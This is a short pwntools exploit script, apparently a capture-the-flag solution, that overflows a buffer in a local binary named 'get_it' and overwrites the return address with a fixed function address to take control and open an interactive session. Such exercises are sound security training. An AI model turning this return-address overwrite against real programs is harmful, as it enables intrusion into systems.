from pwn import *

pwn = process('./get_it')

buf = b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB'
buf += p64(0x004005b6)

pwn.sendline(buf)
pwn.interactive()
